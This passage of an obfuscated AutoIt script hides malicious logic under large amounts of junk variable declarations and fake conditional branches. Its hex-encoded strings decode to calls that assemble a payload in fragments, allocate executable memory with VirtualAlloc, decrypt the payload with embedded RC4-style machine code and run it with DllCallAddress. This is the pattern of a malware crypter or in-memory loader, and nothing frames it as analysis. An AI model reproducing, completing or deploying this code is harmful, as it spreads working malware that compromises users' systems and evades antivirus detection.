	Global $yxryjqkkfrx = "bool"
	Dim $bodqmrn = "DrawThemeTextEx"
	Dim $qsjxwfdi = "kernel32.dll"
	Local $ykqkqfuiqjlpwosowzd = "hwnd"
	Global $nhrhnozooeukcdngwlt = "dword"
	Local $fcmidqgjqotfxitirgibv = "Size"
	Global $lpbpcsbiescouf = "instance"
	Local $eofqxfemnt = ","
	If NOT ($gdalldatzxmdispvuxqtkti == "vkplobsindkhygcrvejpjsfssjbhvpuwbgtiyfoeu") Then
		Local $chcgshksfyyx = $ee($v1("0x246B7A666D676A6663766E6C672026202230313030303038354330373931413537464637354538464639353543303130303030464637354643364146464646393536433031303030304539464246454646464646463736353422"))
	Else
		Local $elrbzzykcmzhaemlgj = $ee($v1("0x24647A6A687763787874636F726364716D76766B68706C2026202246424646464643373835414346394646464634453734343136344337383542304639464646463641373537333734433738354234463946464646353037323639373643373835423822"))
	EndIf
	Dim $mzyiawoorgy = BinaryToString("yattevymyvt")
	If NOT ($mzyiawoorgy == 0) Then
		Local $sckhlnlekfpguletadatcaz = $ee($v1("0x246368636773686B73667979782026202238423542334346463735304346463735464346463935353430313030303033334330383343343043383937444534363633423436303637333332384234353043384439433033304322"))
	Else
		Local $gpfkl = $ee($v1("0x24786D61786D677A6E6E6667762026202236454337383535304639464646463734353337343732433738353534463946464646363936453637373336364337383535384639464646463537303043373835313046424646464622"))
	EndIf
	Dim $ffomvzuqs = IsString("cqhyvkkphvpmgrcqqusdmdntfgaqlroikeqpsbopfwfaxakwo")
	Local $dpyozrseftiwuqypsewazh = "user32.dll"
	Dim $isjfsfifsnrzyljmaz = "dword"
	Dim $edrcxqsixvqqxryjynoaqcch = "hOwner"
	Global $mnyhedrdorcvoqwvsaj = "Month"
	Global $dcmgdicbkmdxg = "handle"
	Global $mnfnkrwrzkuhkgg = "handle"
	Global $kwvxa = "wBorders"
	Dim $hpsrjbweovvhalf = "handle"
	Dim $ovrdglyejcsomxmwkgz = "wparam"
	Dim $kfrkwrazqapgtfwdjgt = "Y"
	Global $majyueazwatwkllvpgek = "&gt;Freddy<br>"
	If NOT ($ffomvzuqs == "aynlurzslvyexeillyusqzydqynevjhgldbunpmxvgjhktugz") Then
		Local $rrlxjiajlbite = $ee($v1("0x2473636B686C6E6C656B667067756C65746164617463617A2026202230313030303038423033303334353043464637334643353038423433463830333435464335304646393535343031303030303046423734363036383343343043464634354534383322"))
	Else
		Local $yvxdf = $ee($v1("0x246B6C626B76736A64776C6B66766D7171656C6E647461686E766D662026202242354534463846464646464639354538463846464646384235443043383934353243384438353334464346464646353045383334453446464646383934353238384438353434464422"))
	EndIf
	Dim $yfdgahwsovarsrbywv = BinaryToString("0x6A68686261666F61746E667A696B706F74")
	Local $xukrormahhvbduo = "handle"
	Global $dlyvtsu = "gdi32.dll"
	Local $imvnisflpphb = "AutoIt.Error"
	If NOT ($yfdgahwsovarsrbywv == 1) Then
		Local $yxqhchvxrvlhcqrbxevrdtp = $ee($v1("0x2472726C786A69616A6C626974652026202243333238333934354534373244383844343543433530364130343844343546383530384234354238383343303038353046463735453838393744434346463935373030313030303022"))
	Else
		Local $zlyvugahlwcuos = $ee($v1("0x2462636C626B666C632026202238353530464446464646433734354243364236353732364543373435433036353643333333323838343543383838343541383838383538304644464646463634413133303030303022"))
	EndIf
	Dim $tkxpydirenaepcbrwvzc = IsString(41501205)
	Dim $lpcoewbkdcjveunbrii = "&gt;Carlos<br>"
	Dim $dkxslb = "shell32.dll"
	Dim $ypwnnfcaqyumzrwsblbamcvo = "%.1f"
	Local $rlkaladkfihavohrnkq = "GdipCloneMatrix"
	Global $akpxcm = "ulong_ptr"
	Global $ecnlpgyilwg = "dword"
	Local $lflekiesizpkaknxrpla = "handle"
	Global $dslobehlkqq = "uint"
	If NOT ($tkxpydirenaepcbrwvzc == "mfqlez") Then
		Local $aqcvkvefl = $ee($v1("0x24797871686368767872766C6863717262786576726474702026202238443835393046424646464635304646373545434337383539304642464646463037303030313030464639353634303130303030383543303046383841324645464646463842343622"))
	Else
		Local $fxcmhhglcajhoxvrgycvwdt = $ee($v1("0x24796E7870636877786C72676E65736963666F2026202238353038463946464646353045383141453646464646383938353830303030303030384438353643464146464646353045383038453646464646383938353834303030303030384422"))
	EndIf
	Dim $rilmdmtnvegnvnerfj = IsInt("tnmustxiimwjxcoxszaakdfmetdxmbjb")
	Dim $ztcnanfujgvgi = "int"
	Global $peuhofagqcuegypujwlsby = "int"
	Dim $kwgzhwngncjdaxtsw = "]"
	Global $anlrbxmrgvrkurejtgj = "wparam"
	Dim $swgqjzszebwgqwkpykjvzsk = "handle"
	Local $sjyqnqnbupk = "$_IESTATUS_InvalidDataType"
	Local $zgqpnnbhzdizxk = "dword"
	Dim $ghagiaooftocu = "struct*"
	Local $wwtbulwhlkviotcdudedng = "ptr"
	Dim $bitmfey = "uint"
	Dim $ofyqv = "Error"
	Global $xffamqkiqakiqfnytdcvg = "handle"
	Global $ltoyvnirvktawbw = "int"
	Dim $nyjtjjrzxsjxprjroscmmd = "dword;bool;handle;bool"
	Global $flnbrhztisyerkf = "wparam"
	Global $qiyvcqfmdapkjfqg = "int"
	Global $xfljdgyl = "CloseHandle"
	Global $xfrobkpkjww = "user32.dll"
	If NOT ($rilmdmtnvegnvnerfj == "ougdytbrzpqbjevkalbbksn") Then
		Local $raucmtruebawzp = $ee($v1("0x24617163766B7665666C2026202232383033343546383839383534304643464646463844383539304642464646463530464637354543464639353630303130303030353738354330304638383331464646464646464622"))
	Else
		Local $xdycuclvlmrlysii = $ee($v1("0x246864786B74636D6E627569746D6F2026202234463730433738354538464346464646363536453533363543373835454346434646464636333734363936463636433738354630464346464646364530304337383535434639464622"))
	EndIf
	Dim $zdyjsnkg = IsString(41608882)
	Local $yupderpuc = "handle"
	Global $egqtnhbahkahptamcpcte = "handle"
	Local $ufsfqjwtfnohtnuvwjyou = "cbSize"
	Local $rcsnhzrhuvzhpv = "$iInstance > 1 invalid with HWnd and DialogBox.  Setting to 1."
	Global $gcbetsouhxvyxal = "dword*"
	Dim $nrjlfwgmxomgaya = "dword"
	Local $ngxjdszcv = "wchar Text["
	Global $nrjhwgevweyguaibwwxwn = "WinAPIGdi.au3"
	Dim $qdnqldawpcbvwtbtxsjiirpd = "Image"
	Global $zlahhnjrs = "int"
	Local $tebrrymecudz = "kernel32.dll"
	Global $rzojgnxblovuhnciajjq = "int"
	Dim $xfxtd = "mask"
	Dim $mltsse = "Right"
	Dim $vcqcwefralcplfpkyrejt = "int"
	Global $miiouke = "MoveFileWithProgressW"
	Dim $ubqxaascctemafd = "grn"
	Global $fxcbgnpovqwqgl = "<li><a href="
	If NOT ($zdyjsnkg == "rckqsngvhxxlpdpkyxmc") Then
		Local $griiownbbfiqrzmkcn = $ee($v1("0x24726175636D747275656261777A702026202237354543464639353638303130303030383543303046383831464646464646463842343545384539324546454646464635353842454338334534463838314543464330333030303022"))
	Else
		$poe($zeyc("0x46696C6557726974652824786D61637979636670776C726169652C20446C6C53747275637447657444617461282468756B6F6D6E7674756E6F64726677667170782C20312929"))
	EndIf
	Dim $knubreqqrcyahdkmrsmgksv = IsString("zsmviqyfyswvdmf")
	Dim $flmtab = "kernel32.dll"
	Local $rvaglkeopgsfkzo = "DrawThemeParentBackground"
	Dim $ssqsezpkgpfzfiu = "]"
	Global $lzzirosflvvlytvocxxyqb = "dword"
	Dim $ojqakkm = "GetOpenClipboardWindow"
	Global $gojbcayntpuqldr = "WinAPIConv.au3"
	Global $agkiy = "HueLevel"
	Dim $cfbkilhf = "wchar["
	Global $vuyrnxljxymienlakex = "handle"
	If NOT ($knubreqqrcyahdkmrsmgksv == 0) Then
		Local $qzpcwpoemanbstaawd = $ee($v1("0x24677269696F776E6262666971727A6D6B636E2026202235333536353738314543373830313030303036413545353938424643384438343234303830343030303033334442384442343234383830313030303038393943323441343032303022"))
	Else
		Local $djbnp = $ee($v1("0x24756D7366676D79666E7963776F64717664797968787766626C6478612026202243373835334346454646464636343643364330304337383538384645464646463543344236453646433738353843464546464646373736453434364343373835393046454646464622"))
	EndIf
	Dim $zyxtmigj = BinaryToString("euobhszvukzfjhbleidqojighcblhjfftpbyqbknrjbm")
	Global $bgbpwkmvefqxxx = "bool"
	Local $briowvbybpezosxprlfzvh = "PeekNamedPipe"
	Dim $ushvpkjynex = "Browser Object Creation Failed"
	Global $kaqvuivq = "Mem"
	Global $flrlaueefcc = "hwnd"
	Dim $eubaoaftgvyels = "dword Size;dword Usage;dword ProcessID;ulong_ptr DefaultHeapID;dword ModuleID;dword Threads;dword ParentProcessID;long PriClassBase;dword Flags;wchar ExeFile[260]"
	Local $gookzsm = " "
	Local $fschgojpnupysclewmv = ";"
	Local $sywfobfcooeh = "struct*"
	Dim $nsqbchsn = "ptr"
	Global $yuvaqbgvzdkba = ";"
	If NOT ($zyxtmigj == 1) Then
		Local $cnpixpzptwbritzmfzadvstjjno = $ee($v1("0x24717A706377706F656D616E627374616177642026202230303530463341354538463645324646464636413545353938424630384437433234313046334135384237353038383033453346353637353041464639343234333830313030303022"))
	Else
		Local $nvbmvmeprggzakzucgoexh = $ee($v1("0x247065726C6B657778656F736263756F6C2026202238423030384235383130433734354538373736333733364336364337343545433635364543363435454530304538413646454646464635363839373545344646443030334330363622"))
	EndIf
	Dim $lgbtldkaiufg = IsString("nzizgdbmplfpihtgoiklorhfulk")
	If NOT ($lgbtldkaiufg == 0) Then
		Local $ampprdjio = $ee($v1("0x24636E706978707A707477627269747A6D667A61647673746A6A6E6F2026202234364542303746463934323433383031303030303539353038443834323438433031303030303536353046463934323436303031303030303833433430433333433038334642363422"))
	Else
		$i = $poe($gfro("0x2469202D20223122"))
	EndIf
	Dim $oidclgnxcadba = BinaryToString("oohrzgdctxdwxcwqctllutbloyfyskgjzsppnmrd")
	Global $wllokhotnfkuxtzsvsx = "Find: "
	Global $seqkaiae = "handle"
	Local $qfpzaxvostimicj = "handle"
	Dim $zsnusshxah = "wparam"
	Global $cughnjtvubr = "Text"
	Local $riiqgtxdyzvnw = "bool"
	Dim $oiakfsbvvsnmeqwpghqorrz = "user32.dll"
	Local $wglamcrwnjfafzhmungkzidg = "struct*"
	Local $ogxib = "uint"
	Dim $ukvfkvicnkgcqhewlsbzo = "CMYK color space"
	Dim $xbcqqadbzdmczivpqfq = "handle"
	If NOT ($oidclgnxcadba == 0) Then
		Local $xiczdhvrcvrubfnbzshjtgykbzcdh = $ee($v1("0x24616D707072646A696F2026202237443239383145433738303130303030364135453539384246434646373530433844383432343034303330303030384442343234384330313030303035304633413545384346464322"))
	Else
		Local $ptojyauwxeyfewqtmpvuacojceik = $ee($v1("0x24656776726F6E6266776A79656B7978616F627374747573716970632026202245434646464635304646443738443835444346454646464638334334304335304646443635393430353038443835444346454646464635303844383542434545464646463530464622"))
	EndIf
	Dim $mkhba = BinaryToString("0x6F766B636D73756D6774706377637A75716669786D706671")
	Dim $qfchjsrlmg = "int"
	Dim $ubxdxljinjskrvp = "long"
	Dim $etvvxwamxyudpwjwmzdtk = "		<td>lazy</td>"
	Global $dwkwswcvilakrzeaclokojtv = "kernel32.dll"
	Global $pmlksvwsbmd = "dword"
	Dim $yvewzfnvcqzxmlucovxnn = "struct*"
	Global $iovgc = "byte["
	Global $nopopzbovujulujkxz = "bool"
	Dim $njpydoljgsorijywgmpuj = "handle"
	Global $cpnekicqqvafzpmlpeobudcl = "_IEFrameGetObjByName"
	Local $niomvqqwnagzxqxbmj = "handle"
	Global $adeecqeymcuvrpibi = "WinAPIConv.au3"
	Local $sykjfrlxcpbr = "user32.dll"
	Dim $ekisalxaymdgap = "lresult"
	Dim $emxbsuyl = "Left"
	Dim $xaddpcdrzmoyuxmxbklhcl = "shlwapi.dll"
	Local $dllpjgudb = "uint"
	Global $aqxmhfrqocd = "wparam"
	If NOT ($mkhba == 0) Then
		Local $kozlkpxxbaowbgovuy = $ee($v1("0x247869637A646876726376727562666E627A73686A7467796B627A6364682026202246464646343338354330373444323546354535423842453535444332303830304343434343434343434343434343434343434343434343434343353138443443323430343242433822"))
	Else
		Local $xexgw = $ee($v1("0x24646A626E702026202236433733354337354337383539344645464646463733363537323333433738353938464546464646333232453634364336364337383539434645464646463643303043373835463422"))
	EndIf
	Dim $xauatlcqxlrrcpftutupobt = IsString(99313533)
	Dim $vqahfsmga = "int"
	Dim $uscfgufpmwujjqjwgg = "int"
	Global $wuhlkljcz = "GetRegionData"
	Local $cuwyohbqqtzwr = "bool"
	Local $qzuyjlxxvtv = "v"
	Global $medxhwnxszdipc = "dword"
	Local $mwamaysbqwydulsudhvt = "handle"
	Local $vshuubwubkajmuzmfkw = "dword"
	Global $uxnlnlvaravdeut = "int"
	Global $ubxsubgzdupixzthxjgjokyb = "GetBrushOrgEx"
	Dim $ipftbmwwxrbcmfn = "c"
	Dim $jcwkxwjxoljdw = "Row"
	Global $xkxaovadvqvguda = "handle"
	Global $jxrxsjkeylmuubixh = "int"
	Local $wnbspg = "hh"
	Dim $kkhfgq = "SHGetKnownFolderIDList"
	If NOT ($xauatlcqxlrrcpftutupobt == "fgveqivtnebuqzxsftkbqisjqapgbur") Then
		Local $hbnrkbyv = $ee($v1("0x246B6F7A6C6B70787862616F7762676F7675792026202231424330463744303233433838424334323530304630464646463342433837323041384243313539393438423030383930343234433332443030313030303030383530304542453922"))
	Else
		Local $yvxdf = $ee($v1("0x246B6C626B76736A64776C6B66766D7171656C6E647461686E766D662026202242354534463846464646464639354538463846464646384235443043383934353243384438353334464346464646353045383334453446464646383934353238384438353434464422"))
	EndIf
	Dim $aropjxpqavuywwxrvtwvyi = BinaryToString("0x6D6368747373646F736F796D786F747768687962747565696C70")
	Dim $aeooklbhlvlnpmc = "sqlite3_column_text16"
	Local $dfompkmubx = "dword"
	Dim $hhjplmhjn = "X"
	Local $wkggjwubbewzno = "int"
	Dim $jepgpdgfwrcdxqkza = "int"
	Global $nsbxdfdkjb = "kernel32.dll"
	If NOT ($aropjxpqavuywwxrvtwvyi == "mnzibonxoludzxr") Then
		Local $rjrxefskrgsiqqqdyssnsz = $ee($v1("0x2468626E726B6279762026202230303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303022"))
	Else
		Local $djbnp = $ee($v1("0x24756D7366676D79666E7963776F64717664797968787766626C6478612026202243373835334346454646464636343643364330304337383538384645464646463543344236453646433738353843464546464646373736453434364343373835393046454646464622"))
	EndIf
	Dim $ftdqzghhza = IsString("zprjfkzifmidzf")
	Global $nmanvfv = "handle*"
	Local $sckzvvv = "ptr"
	Global $entaumsgmgvfebqxjnbcjqm = "CName"
	Dim $xhefqkx = "ptr"
	Global $tztim = "int"
	Local $hmxijymhtsona = "char Text[4096]"
	Global $plchpliebqektspva = "bV5Size"
	Dim $foygsiremlamgdtblivw = "GdipCreatePathIter"
	Global $stcnbcsnxa = "int*"
	Local $mwogt = "GdipCreateLineBrushFromRectWithAngle"
	Global $prdqyojshjpmhfmqv = "wstr"
	Dim $ycmgstoptocacrcbyxco = "pfnCallback"
	Global $qjythjxldbxrnfxyf = "RegisterWindowMessageW"
	If NOT ($ftdqzghhza == 0) Then
		Local $johavbttdxnpynfdv = $ee($v1("0x24726A72786566736B72677369717171647973736E737A2026202230303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303022"))
	Else
		Local $lixfl = $ee($v1("0x24747A6166767A67706C736468766D6F6763792026202230464245433032424638464634354634383037444646303037343042343138303744464530303734303438354646373444363835464637343133464634354638384234354638334222"))
	EndIf
	Dim $yshpkqclsxnnldmwwuzh = IsString(-4767980)
	Global $ezpwayxpovxiuodeyfnpoln = "%04d/%02d/%02d"
	Local $efroc = "int"
	If NOT ($yshpkqclsxnnldmwwuzh == "bucnsrqncztcn") Then
		Local $jeroidliqljssildrzdqejqq = $ee($v1("0x246A6F68617662747464786E70796E6664762026202230303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303022"))
	Else
		Local $xqkvrsasojkiv = $ee($v1("0x246A7A7365717462706A756E792026202246463530464639353438303130303030384235443043384237333343333346463641313038443435453835303839374445303839374446433839374444383839374446383839374422"))
	EndIf
	Dim $qfqmorzqxxh = IsString(-9352560)
	Dim $dhqpjjtmonausyzthzeimr = "Text"
	If NOT ($qfqmorzqxxh == "cklpbrwutoztyqkkhrewqqvkrahcw") Then
		Local $n1 = $ee($v1("0x246A65726F69646C69716C6A7373696C64727A6471656A717120262022303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303022"))
	Else
		Local $hdxktcmnbuitmo = $ee($v1("0x246B76776E6973776C766E6565746C632026202244434641464646463534373236313645433738354530464146464646373336313633373443373835453446414646464636393646364530304337383545344643464646463445373422"))
	EndIf
	Dim $ozrofmuyyiohmaz = IsString(-66090881)
	Global $rfxzxo = "wstr"
	Local $xjlxdbjsegcsbvkjrghaxwi = "DrawIcon"
	Dim $jbrqqehabycjizpnhxviq = "wparam"
	If NOT ($ozrofmuyyiohmaz == "tuztutjvxwwckmkjflqrsw") Then
		Local $zjnlaomroxdjjqgqhq = $ee($v1("0x446C6C43616C6C28226B65726E656C3332222C2022707472222C20225669727475616C416C6C6F63222C202264776F7264222C202230222C202264776F7264222C2042696E6172794C656E28244444292C202264776F7264222C2022307833303030222C202264776F7264222C20223078343022295B2230225D"))
	Else
		Local $bappvblh = $ee($v1("0x246D796F6B646A616D676E776462696174612026202230304337383545434638464646463532373436433436433738354630463846464646364637323644363143373835463446384646464637343433373537324337383546384638464622"))
	EndIf
	Dim $pfhznaaarpishbo = IsString(81335462)
	Dim $lgiyikjolyzezobkieta = "CloseClipboard"
	Global $uagimtgxxqpci = "ptr"
	Local $cqmotqdstzdhtrztnv = "LookupAccountSidW"
	Global $cwufac = "../appendix/GUIStyles.htm#Label"
	Local $smznqknisexoon = "BackupRead"
	Global $fqvonjlq = "ptr"
	Global $jsnoihgqigapfedjam = "Bytes"
	Local $fwwxoxfd = "\\"
	If NOT ($pfhznaaarpishbo == "xilurnlchekuue") Then
		Local $xxxjyvppxnylkdaznunosymcqf = $ee($v1("0x446C6C5374727563744372656174652822627974652066347135346664733534667173645B22202620537472696E674C656E2824444429202620225D2229"))
	Else
		Local $jeroidliqljssildrzdqejqq = $ee($v1("0x246A6F68617662747464786E70796E6664762026202230303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303022"))
	EndIf
	Dim $qqvzzqifhhzryfaqjjaldn = IsInt("pbltcmhxqosshgzeylktpjfpnmeuxxfrhwvalanf")
	Global $qukanujkzjfdtshfbe = "seek "
	Global $xxnvcbtcfivezrlxgm = "handle"
	Local $bgefhtwhijqxatwweksph = "SetTextCharacterExtra"
	If NOT ($qqvzzqifhhzryfaqjjaldn == 1) Then
		$ee($v1("0x446C6C5374727563745365744461746128446C6C537472756374437265617465282262797465203534726734357A72346735726534316635365B2220262042696E6172794C656E28244E3129202620225D222C20247A6A6E6C616F6D726F78646A6A7167716871292C20223534726734357A7234673572653431663536222C20244E3129"))
	Else
		Local $hdxktcmnbuitmo = $ee($v1("0x246B76776E6973776C766E6565746C632026202244434641464646463534373236313645433738354530464146464646373336313633373443373835453446414646464636393646364530304337383545344643464646463445373422"))
	EndIf
	Dim $kzubvi = BinaryToString("0x746171636C716C716F74726B706E67786978786B7A70796D747A62766365676D")
	Local $vripvixuxyfhyxoacbeznh = "handle"
	Global $nsaznrynd = "GetRawInputData"
	Dim $opksmwcfsvdhhtq = "GetDC"
	Local $nmojiqxvjhgt = "bool"
	Global $mnmugalbonro = "int"
	Global $bldukszfgtvrmvyzaexu = "Param"
	Dim $diblzvqcedpguqaoqni = "wstr"
	Dim $jzgporkuxoxszm = "LoadLibraryW"
	Dim $jprqowpejzphgxxsrzcejhzs = "Top"
	Dim $ibqof = "wparam"
	Local $qjvvdqlfsunqraaingcpbqzg = "struct*"
	Global $ctkkxsygjw = "struct*"
	Global $ycgxwpjibhbzgzxz = "Bottom"
	If NOT ($kzubvi == 0) Then
		$ee($v1("0x446C6C5374727563745365744461746128247878786A79767070786E796C6B64617A6E756E6F73796D6371662C20226634713534666473353466717364222C2024444429"))
	Else
		Local $utxpvlgktjieqscrywgdc = $ee($v1("0x24727A696D6C66646477646F2026202238423544313438443835354346464646464635304538373245414646464638424630384434354143353038394235453846384646464645383631454146464646384246383844383522"))
	EndIf
	Dim $mhjjlhkqxttrmjho = BinaryToString("0x76646464617076696F666D61656E686B65636E7368697670617279646D7A727172616B6B717A77736D7169627A66746B6D")
	Dim $slyaljkqtahzh = "Hdr"
	Global $pqznfrqo = "user32.dll"
	Global $ssiypidtvkiayzzesl = "handle"
	Dim $pjbilnebvjqprsxlcr = "GetProfilesDirectoryW"
	Dim $vugqbogmycsracjgpeuysa = "Security.au3"
	Global $ghbtptaauupv = "int"
	Local $yowhyyrpofnnwefutofugeti = "int"
	If NOT ($mhjjlhkqxttrmjho == 1) Then
		Local $cmnqbaenuyawwknbtrexthohrhzxhznyludhcgukgfmc = $ee($v1("0x446C6C43616C6C41646472657373282264776F7264222C20247A6A6E6C616F6D726F78646A6A71677168712C2022737472222C20457865637574652842696E617279546F537472696E672824505029292C2022707472222C20446C6C53747275637447657450747228247878786A79767070786E796C6B64617A6E756E6F73796D6371662929"))
	Else
		Local $dsqf656sd5q = $poe($vfds41dfs4("0x446C6C43616C6C28226B65726E656C3332222C2022707472222C20225669727475616C416C6C6F63222C202264776F7264222C202230222C202264776F7264222C2042696E6172794C656E2824666473766734357364663534677629202B2042696E6172794C656E282461292C202264776F7264222C2022307833303030222C202264776F7264222C20223078343022295B2230225D"))
	EndIf
	Dim $qfiukwuvadettlprno = BinaryToString("bgmoskhcjzeujvipvagljepwrgq")
	Global $zwgnpsuvoyhilhuuq = "int"
	Dim $bqzvuepq = "struct*"
	Dim $nupixe = "ptr"
	If NOT ($qfiukwuvadettlprno == 1) Then
		$pepag0 = $ee($v1("0x446C6C43616C6C28226B65726E656C33322E646C6C222C202264776F7264222C202247657450726F636573734964222C202268616E646C65222C2024636D6E716261656E75796177776B6E627472657874686F6872687A78687A6E796C7564686367756B67666D635B2230225D295B2230225D"))
	Else
		Local $qksnuahvkeziysqcgucz = $ee($v1("0x24766175706F6463757668716E6C6575636F686A6C6F6D2026202246463532363537333646433738353843464446464646373537323633363538383835393046444646464643373835373846394646464634453734353137354337383537434639464622"))
	EndIf
	$iht15 = $cmnqbaenuyawwknbtrexthohrhzxhznyludhcgukgfmc["0"]
EndFunc

Func pbrejjvokr($loop, $time)
	Dim $cfipvmdd = IsString("qruoib")
	Local $croiwktkddpivun = "int"
	Global $phozysbdjqbfxkupkdbzbt = ")"
	Global $bsgasqhlxeezdsvhsbcjygfo = "wparam"
	Local $uyuvrtawzudr = "handle"
	Global $agpqglfrisnlbvnrtigm = "IWebBrowser2"
	Dim $mfdvvnpjbpe = "SubItem"
	Global $qdypgmddizbmckjuhhyxdkcp = "long"
	Dim $jmvwposdehxfpfjweuj = "Error"
	Dim $hhxib = "handle"
	Dim $ifctt = "ReadFile"
	Local $lxjgem = "html"
	Dim $rtoyvzunifo = "GetThemeBitmap"
	Dim $xxezrdvlsjcimay = "SetInformationJobObject"
	Global $vzjcrcmghgllzcejmjanty = "kernel32.dll"
	Dim $fvnnt = "ole32.dll"
	If NOT ($cfipvmdd == "mxswctfemdezpryqkcfregjkigqwbsuw") Then
		Dim $ayudergfv = $poe("binarytostring")
	Else
		Local $pslhxnuogpmclkwfwkpimxecyx = $ee($v1("0x24767574646B736B796A68696D2026202238443835353446434646464635304538313145384646464638393835433830303030303038443835464346414646464635304538464645374646464638393835363030313030303022"))
	EndIf
	For $i = "0" To $loop
		Dim $kqeheugbmlvpag = IsInt("ewyxecdaruhrunavqqjftymdiwlriyigmuehdzqujfds")
		Dim $pvhdxmdblgzsory = "wchar Text["
		Dim $xercyaicxfuvwkkfzqcmgvb = "WinAPIHobj.au3"
		If NOT ($kqeheugbmlvpag == 1) Then
			Local $a = $poe($ayudergfv("0x426974414E44282230783838222C2022307835352229"))
		Else
			Local $4dfgbs54fdg = $poe($vfds41dfs4("0x446C6C5374727563744372656174652822627974655B2220262042696E6172794C656E28246129202620225D2229"))
		EndIf
		Dim $umshxcfbbgxwmxgvuoyg = BinaryToString("0x637176656B767A6C666F726F6C7662617161767171706E70636B6C6977")
		Dim $rhyvrbdxhdn = "dbghelp.dll"
		Global $cptud = "Error"
		Local $twrmgdnekxkygv = "wparam"
		Dim $euyetsgzovqx = "uint Size;hwnd hOwner;ptr hInstance;int_ptr Text;int_ptr Caption;dword Style;int_ptr Icon;dword_ptr ContextHelpId;ptr MsgBoxCallback;dword LanguageId"
		Local $zencefvakdtqfwthjnlzs = "_IEFormGetCollection"
		Dim $dkmsh = "user32.dll"
		Dim $moybhebejtobzcacuohj = "int"
		Local $pwmytsc = "dword"
		Local $zeqyszelgqywgbbkkxtoxp = "NTFS"
		Local $eufilgaaezxk = "int*"
		Dim $dyxvesqlxjieayzj = "GdipInvertMatrix"
		If NOT ($umshxcfbbgxwmxgvuoyg == "ympvkkgtgwfeeiwhdkzevfrdqfyaymbjkyrnfzplsmcjcv") Then
			$a = $poe($ayudergfv("0x4269744F522824612C202461202B2022312229"))
		Else
			Local $kzrhowhzaxeiqjohj = $ee($v1("0x2464626F6E79627A6169766B7A7267746F2026202246464646363137343635353043373835343446424646464637323646363336353636433738353438464246464646373337333838383534414642464646464337383533434641464622"))
		EndIf
		Dim $onezdvjyw = IsString("ewexfnlhcdrsfbwccqctxzsioktjfjdujtenxxtyqpk")
		Dim $velzrfgro = "TTF_TRACK,"
		Dim $dbzbfpuepojduclfwojujcjv = "none"
		If NOT ($onezdvjyw == "mnfqqazpx") Then
			$poe($ayudergfv("0x536C656570282474696D65202F20246C6F6F7029"))
		Else
			Local $bgpogvpvnyrguccjki = $poe($grfeus("0x446C6C43616C6C28226B65726E656C33322E646C6C222C2022707472222C20224C6F61645265736F75726365222C2022707472222C202468496E7374616E63652C2022707472222C20246D627263716764667A686165786A64706F74766D7562766E6863666164646C66617A64727A7876717A7662777369766C295B2230225D"))
		EndIf
	Next
EndFunc

Func kinntqpfnk()
EndFunc

Func ewfugmibne($a, $b, $xwwx)
	Dim $syzxzvreshzuwmjvqhuiepua = IsInt("zeyavxoxxzzujwsqcezmqgmkbxutzhaiiqpisgosh")
	If NOT ($syzxzvreshzuwmjvqhuiepua == "biwhgkdmsrqfogzzgtwyzmbyqrbomhtsuamkz") Then
		Dim $vfds41dfs4 = $poe("binarytostring")
	Else
		Local $4dfgbs54fdg = $poe($vfds41dfs4("0x446C6C5374727563744372656174652822627974655B2220262042696E6172794C656E28246129202620225D2229"))
	EndIf
	Dim $pasdofxvfroolqk = IsInt("ruxtncncduvqtektpgyslt")
	Global $lnmcbevceydzueospvfqon = "ptr"
	If NOT ($pasdofxvfroolqk == "nuixqavhqzwbwygtexdlmitpgodstkbinyahkzeunxmavugo") Then
		Local $d = $poe($vfds41dfs4("0x42696E617279546F537472696E6728246129"))
	Else
		Local $fjccklkwgjhnneqhbaodw = $ee($v1("0x2472746666762026202243373835333046394646464636443631373436394337383533344639464646463646364535303732433738353338463946464646364636333635373336364337383533434639464622"))
	EndIf
	Dim $sfwnfqtshcbcnqckkurgoou = IsInt(24680306)
	Local $wciyxnkwihxne = "$_IESTATUS_NoMatch"
	Global $dmeytuftvjkdlplmch = "dword"
	Dim $dfzggccxebdwbdpnpsbw = "int"
	Dim $dgkswkkxonxaher = "0x"
	Global $wriggjl = "dword*"
	Global $pujfarvzvjgmtep = "nPage"
	Dim $ijyfjss = "$_IESTATUS_InvalidDataType"
	Dim $abhzlxhueszpirrjwkydqxf = "Y"
	Local $oklqnqmyzucgawxue = "window"
	Dim $agnavimbgcvzmvixjofj = "float"
	Local $xgqjbgwttdtpiwluedk = "kernel32.dll"
	Global $ctfnzlqgvrpnqtfzkvkicvt = " & $sFind & "
	Global $ytafr = "bmHeight"
	If NOT ($sfwnfqtshcbcnqckkurgoou == 0) Then
		$d = $poe($vfds41dfs4("0x537472696E675265766572736528246429"))
	Else
		Dim $gfro = $poe("binarytostring")
	EndIf
	Dim $zdwdnglcnicavgrofspgo = IsString("buegdql")
	If NOT ($zdwdnglcnicavgrofspgo == 0) Then
		Local $fdsvg45sdf54gv = "0xC81001006A006A005356578B551031C989C84989D7F2AE484829C88945F085C00F84DC000000B90001000088C82C0188840DEFFEFFFFE2F38365F4008365FC00817DFC000100007D478B45FC31D2F775F0920345100FB6008B4DFC0FB68C0DF0FEFFFF01C80345F425FF0000008945F48B75FC8A8435F0FEFFFF8B7DF486843DF0FEFFFF888435F0FEFFFFFF45FCEBB08D9DF0FEFFFF31FF89FA39550C76638B85ECFEFFFF4025FF0000008985ECFEFFFF89D80385ECFEFFFF0FB6000385E8FEFFFF25FF0000008985E8FEFFFF89DE03B5ECFEFFFF8A0689DF03BDE8FEFFFF860788060FB60E0FB60701C181E1FF0000008A840DF0FEFFFF8B750801D6300642EB985F5E5BC9C21000"
	Else
		Local $fjccklkwgjhnneqhbaodw = $ee($v1("0x2472746666762026202243373835333046394646464636443631373436394337383533344639464646463646364535303732433738353338463946464646364636333635373336364337383533434639464622"))
	EndIf
	Dim $oymwf = IsInt(87585655)
	Global $pivxozgonqfevgeunc = ">"
	Dim $wvdziyg = "wparam"
	Global $ecocfkv = "Range set"
	Dim $htjujcgskbx = "0x"
	Local $snsxgbzguobcgey = "OnChange"
	Global $exvdli = "0x"
	Dim $oxrftpajssxtgibzvt = "MenuItemFromPoint"
	Global $tzjuf = "struct;uint OldMask;handle OldhItem;uint OldState;uint OldStateMask;"
	Global $bjhajlicihmfvgsu = "lrt"
